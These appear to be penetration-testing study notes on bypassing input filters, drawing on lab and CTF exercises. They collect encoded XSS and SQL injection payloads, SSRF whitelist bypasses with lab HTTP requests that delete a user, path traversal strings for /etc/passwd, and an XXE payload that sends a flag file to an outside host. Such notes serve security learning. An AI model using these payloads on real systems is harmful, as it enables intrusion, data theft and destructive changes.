>[!important]
>When constructing an attack, you should think about where exactly your payload is being injected. If you can infer how your input is being decoded based on this context, you can potentially identify alternative ways to represent the same payload.

# Encoding examples

Both clients and servers use a variety of different encodings to pass data between systems. When they want to actually use the data, this often means they have to decode it first. The exact sequence of decoding steps that are performed depends on the context in which the data appears. For example, a query parameter is typically URL decoded server-side, while the text content of an HTML element may be HTML decoded client-side.

When constructing an attack, you should think about where exactly your payload is being injected. If you can infer how your input is being decoded based on this context, you can potentially identify alternative ways to represent the same payload.

### URL encoding & double URL encoding

Substituting with a % character and their 2-digit hex code as follows:

```
# Url encoding
[...]/?search=Fish+%26+Chips
[...]/?search=Fish%20%26%20Chips
[...]/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

# Double Url encoding
[...]/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```

## HTML encoding

Substituting the offending characters with a reference, prefixed with an ampersand and terminated with a semicolon. In many cases, a name can be used for the reference.
Interestingly, when using decimal or hex-style HTML encoding, you can optionally include an arbitrary number of leading zeros in the code points. Some WAFs and other input filters fail to adequately account for this.

```html
<img src=x onerror="&#x61;lert(1)&semi;">
<a href="javascript&#00000000000058;alert(1)">Click me</a>
```

## XML encoding

XML is closely related to HTML and also supports character encoding using the same numeric escape sequences. This enables you to include special characters in the text content of elements without breaking the syntax, which can come in handy when testing for XSS via XML-based input, for example.

```xml
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

## Unicode escaping

Unicode escape sequences consist of the prefix `\u` followed by the four-digit hex code for the character. For example, \u003a represents a colon. ES6 also supports a new form of unicode escape using curly braces: `\u{3a}`.

```html
<a href="javascript\u0061alert(1)">Click me</a>
<a href="javascript\u{0000000003a}alert(1)">Click me</a>
```

## Hex & octal escaping

Another option when injecting into a string context is to use hex escapes, which represent characters using their hexadecimal code point, prefixed with \x. For example, the lowercase letter a is represented by `\x61`.

```html
<a href="javascript:\x61lert">Click me</a>                          <!-- Obfuscation via HEX encoding -->
```

>[!note]
>You can sometimes also obfuscate SQL statements in a similar manner using the prefix 0x. For example, `0x53454c454354` may be decoded to form the `SELECT` keyword.

Octal escaping works in pretty much the same way as hex escaping, except that the character references use a base-8 numbering system rather than base-16. These are prefixed with a standalone backslash, meaning that the lowercase letter a is represented by `\141`.

```html
<a href="javascript:\141lert">Click me</a>                          <!-- Obfuscation via Octal encoding -->
```

## SQL CHAR() function

Although not strictly a form of encoding, in some cases, you may be able to obfuscate your SQL injection attacks using the `CHAR()`function. This accepts a single decimal or hex code point and returns the matching character. Hex codes must be prefixed with `0x`. For example, both `CHAR(83)` and `CHAR(0x53)` return the capital letter `S`.

```sql
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84) id FROM table; -- - Decoded in "SELECT id FROM table;"
```

---

# Evasion use cases

## Evading IP restrictions

Some applications block input containing hostnames like `127.0.0.1` and `localhost`.

You can circumvent the filer using:
- Alternative IP representation of `127.0.0.1` (such as `2130706433`, `017700000001`, or `127.1`.)
- IPv6 (`0000:0000:0000:0000:0000:0000:0000:0001` or `: :1`)
- Your own domain name that resolves to `127.0.0.1`

## Evading match case strings

Some applications block input containing sensitive words or URLs, like `/admin` or SQL statements.

You can circumvent the filter using:
- Alternatives [Encoding examples](Evading%20Restrictions.md#Encoding%20examples) (like url-encode, hex, HTML entity, double url-encode, [XSS Filtering bypass](Cross-Site%20Scripting%20(XSS).md#XSS%20Filtering%20bypass), etc.)
- Case variation

## Evading whitelist-based input filters

Some applications only allow input that matches, begins with, or contains, a whitelist of permitted values.

You can sometimes circumvent the filter by exploiting inconsistencies in URL parsing (aka exploiting **parser differentials**):

- Embed credentials in a URL before the hostname (`https://expected-host@evil-host`)
- Use the `#` character to indicate a URL fragment (`https://evil-host#expected-host`)
- Leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control (`https://expected-host.evil-host`)
- URL-encode characters to confuse the URL-parsing code. *This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.* (`example@gmail.com` vs `example@gmail.com%0d`)
- Exploit open redirection vulnerabilities to bypass strictly validated trusted domains (eg. imagine the server accepts only the domain weliketoshop.net, the following open redirect would allows an SSRF to 129.168.0.68: `http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin`)
>[!example]
>```http
>POST /product/stock HTTP/1.1
>Host: 0a40008604dc1e84c293433200fb0054.web-security-academy.net
>Cookie: session=euJyrsJeSgzirZkV6Hvxy7CpYOzlen4h
>Content-Length: 201
>Connection: close
>
>storeId=1&stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttps%3a//127.0.0.1/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos
>```
- Mix multiple techniques together
>[!example]
>SSRF using double url-encoding and HTTP credentials
>```http
>POST /product/stock HTTP/1.1
>Host: 0a7100e0036d60c9c2c90c6b0072001b.web-security-academy.net
>Cookie: session=NnrIA2v71rTLnuds4qpbsbH6psfcgm2l
>Content-Length: 95
>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
>Content-Type: application/x-www-form-urlencoded
>Accept: */*
>Connection: close
>
>stockApi=http://localhost:80%252f%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos
>```
- Evading restrictions importing data fromelsewhere using out-of-band requests
>[!example] Example of OOB [XML External Entity Injection (XXE Injection)](XML%20External%20Entity%20Injection%20(XXE%20Injection).md)
>
>```xml
><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
><!DOCTYPE foo [
>    <!ENTITY % xxe SYSTEM "{YOUR_NGORK_URL}/ext.dtd">
>    %xxe;
>]>
><foo>&exfil;</foo>
>```
>*/ext.dtd*:
>```xml
><!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
><!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://192.168.1.199/bypass.xml?%data;'>">
>%abt;
>```
>From [WAFfle-y Order](../../Play%20ground/CTFs/WAFfle-y%20Order.md)
- [Blind XXE by repurposing a local DTD](XML%20External%20Entity%20Injection%20(XXE%20Injection).md#Blind%20XXE%20by%20repurposing%20a%20local%20DTD)
- [Exploit ambiguity](Host%20Header%20attacks.md#Exploit%20ambiguity)


## Evading path, file and shell restrictions

Many applications that place user input into file paths implement some kind of defense against path traversal attacks, and these can often be circumvented.

- Full path instead of `../../../../../file`
- Nested traversals to bypass sequences stripped non-recursively (`....//....//....//....//etc/passwd` or `....\/....\/....\/....\/file`)
- Encoding, double-url encoding or using non-standard encodings (`%2e%2e%2f`, `%252e%252e%252f`, `..%c0%af` or `..%ef%bc%8f` )
- Appending the arbitrary payload to a trusted accepted starting path (`filename=/var/www/images/../../../../../../etc/passwd`)
- Null-bytes to bypass extensions controls (`filename=../../../../../../../etc/passwd%00.png`)
- Using the fuzzing list (Fuzzing - path traversal)
- [Basic LFI and bypasses](File%20Inclusion%20(LFI%20&%20RFI).md#Basic%20LFI%20and%20bypasses)
- [Command Injection Bypasses](Command%20Injection.md#Bypasses)
- [Obfuscating file extensions](Insecure%20File%20Upload.md#Obfuscating%20file%20extensions)

## Evading SQL query detection

- [Bypass detections and avoid quotes and double quotes](SQL%20Injection.md#Bypass%20detections%20and%20avoid%20quotes%20and%20double%20quotes)

## Evading security controls using smuggling

- [Exploiting HTTP Request Smuggling](Exploiting%20HTTP%20Request%20Smuggling.md)

---

# Other resources

- [Bypass detections and avoid quotes and double quotes](SQL%20Injection.md#Bypass%20detections%20and%20avoid%20quotes%20and%20double%20quotes)
- [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
- [XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [A new era of SSRF](https://portswigger.net/research/top-10-web-hacking-techniques-of-2017#1)
- [Cache parameter cloaking](Web%20Cache%20Poisoning.md#Cache%20parameter%20cloaking)
